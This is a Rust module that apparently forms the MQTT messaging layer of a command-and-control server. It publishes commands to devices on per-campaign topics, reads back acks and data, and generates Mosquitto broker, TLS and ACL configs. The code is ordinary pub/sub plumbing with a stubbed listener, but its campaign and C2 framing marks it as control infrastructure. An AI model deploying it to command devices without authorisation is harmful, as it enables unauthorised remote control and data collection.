use anyhow::Result;
use async_trait::async_trait;
use dashmap::DashMap;
use paho_mqtt as mqtt;
use std::sync::Arc;
use tracing::{debug, error, info};

// ============================================================================
// MQTT CLIENT WRAPPER
// ============================================================================

pub struct MqttHandler {
    // MQTT broker connection
    client: Arc<mqtt::AsyncClient>,
    
    // Track device subscriptions
    device_topics: Arc<DashMap<String, String>>,  // device_id -> topic
    
    // Topic format: c2/{campaign_id}/{device_id}/cmd
    campaign_id: String,
}

impl MqttHandler {
    pub async fn new(broker_addr: &str, campaign_id: String) -> Result<Self> {
        let create_opts = mqtt::CreateOptionsBuilder::new()
            .server_uri(broker_addr)
            .client_id("c2-server")
            .max_buffered_messages(1000)
            .build();

        let mut client = mqtt::AsyncClient::new(create_opts)?;
        
        // Set callbacks
        let client_clone = client.clone();
        client.set_message_callback(move |_client, msg| {
            if let Some(msg) = msg {
                let topic = msg.topic();
                let payload = msg.payload();
                debug!("MQTT message received on {}: {} bytes", topic, payload.len());
            }
        });

        // Connect to broker
        let conn_opts = mqtt::ConnectOptionsBuilder::new()
            .clean_session(true)
            .finalize();

        client.connect(conn_opts).await?;
        info!("Connected to MQTT broker: {}", broker_addr);

        Ok(Self {
            client: Arc::new(client),
            device_topics: Arc::new(DashMap::new()),
            campaign_id,
        })
    }

    /// Subscribe device to command topic
    pub async fn subscribe_device(&self, device_id: &str) -> Result<()> {
        let topic = format!("c2/{}/{}/cmd", self.campaign_id, device_id);
        
        self.client.subscribe(&topic, 1).await?;
        self.device_topics.insert(device_id.to_string(), topic.clone());
        
        info!("Device subscribed to MQTT topic: {}", topic);
        Ok(())
    }

    /// Unsubscribe device from command topic
    pub async fn unsubscribe_device(&self, device_id: &str) -> Result<()> {
        if let Some((_, topic)) = self.device_topics.remove(device_id) {
            self.client.unsubscribe(&topic).await?;
            info!("Device unsubscribed from MQTT: {}", device_id);
        }
        Ok(())
    }

    /// Publish command to device via MQTT
    pub async fn publish_command(&self, device_id: &str, command: Vec<u8>) -> Result<()> {
        let topic = format!("c2/{}/{}/cmd", self.campaign_id, device_id);
        
        let msg = mqtt::Message::new(&topic, command, 1);
        self.client.publish(msg).await?;
        
        debug!("Command published to MQTT: device_id={}", device_id);
        Ok(())
    }

    /// Publish data reception acknowledgment
    pub async fn publish_ack(&self, device_id: &str, message_id: &str) -> Result<()> {
        let topic = format!("c2/{}/{}/ack", self.campaign_id, device_id);
        let msg = mqtt::Message::new(&topic, message_id.as_bytes(), 1);
        self.client.publish(msg).await?;
        Ok(())
    }

    /// Get active subscription count
    pub fn subscription_count(&self) -> usize {
        self.device_topics.len()
    }

    /// Disconnect and cleanup
    pub async fn disconnect(&self) -> Result<()> {
        self.client.disconnect(None).await?;
        info!("MQTT client disconnected");
        Ok(())
    }
}

// ============================================================================
// MQTT MESSAGE HANDLER
// ============================================================================

pub struct MqttMessageHandler {
    mqtt: Arc<MqttHandler>,
    command_processor: Arc<dyn CommandProcessor>,
}

#[async_trait]
pub trait CommandProcessor: Send + Sync {
    async fn process_device_message(&self, device_id: &str, payload: Vec<u8>) -> Result<()>;
}

impl MqttMessageHandler {
    pub fn new(mqtt: Arc<MqttHandler>, processor: Arc<dyn CommandProcessor>) -> Self {
        Self {
            mqtt,
            command_processor: processor,
        }
    }

    /// Start listening for messages (would integrate with C2 server)
    pub async fn start_listening(&self) -> Result<()> {
        info!("MQTT message listener started");
        
        // In production, integrate with tokio::select! to handle inbound messages
        // This is a simplified version
        
        Ok(())
    }
}

// ============================================================================
// DOCKER COMPOSE CONFIG (EMBEDDED)
// ============================================================================

pub fn generate_mqtt_docker_compose() -> String {
    r#"
version: '3.8'
services:
  mosquitto:
    image: eclipse-mosquitto:latest
    container_name: c2-mqtt-broker
    ports:
      - "1883:1883"  # MQTT unencrypted (internal only)
      - "8883:8883"  # MQTT over TLS
    volumes:
      - ./mosquitto.conf:/mosquitto/config/mosquitto.conf
      - mosquitto-data:/mosquitto/data
      - mosquitto-logs:/mosquitto/log
    networks:
      - c2-network
    restart: unless-stopped

volumes:
  mosquitto-data:
  mosquitto-logs:

networks:
  c2-network:
    driver: bridge
"#.to_string()
}

/// Mosquitto configuration (ACL + authentication)
pub fn generate_mosquitto_config() -> String {
    r#"
# Mosquitto MQTT Broker Configuration

# Listener on default port
listener 1883
protocol mqtt

# TLS listener
listener 8883
protocol mqtt
cafile /mosquitto/certs/ca.crt
certfile /mosquitto/certs/server.crt
keyfile /mosquitto/certs/server.key
require_certificate true
use_identity_as_username true

# Persistence
persistence true
persistence_location /mosquitto/data/

# ACL file (restrict topics by username/client)
acl_file /mosquitto/config/acl.txt

# Authentication (use external plugin or password file)
allow_anonymous false
password_file /mosquitto/config/passwords.txt

# Performance tuning
max_queued_messages 1000
max_connections -1

# Logging
log_dest file /mosquitto/log/mosquitto.log
log_dest stdout
log_type all
log_timestamp true
"#.to_string()
}

/// ACL configuration (access control list)
pub fn generate_mosquitto_acl() -> String {
    r#"
# Default deny
user *
topic deny $SYS/#

# C2 Server: can publish commands and receive acks
user c2-server
topic write c2/+/+/cmd
topic read c2/+/+/ack
topic read c2/+/+/data

# Devices: can only subscribe to their own command topic and publish acks
pattern read c2/%c/+/cmd
pattern write c2/%c/+/ack
pattern write c2/%c/+/data
"#.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_docker_compose_generation() {
        let config = generate_mqtt_docker_compose();
        assert!(config.contains("eclipse-mosquitto"));
        assert!(config.contains("1883"));
        assert!(config.contains("8883"));
    }

    #[test]
    fn test_mosquitto_config_generation() {
        let config = generate_mosquitto_config();
        assert!(config.contains("listener 1883"));
        assert!(config.contains("listener 8883"));
        assert!(config.contains("require_certificate true"));
    }
}
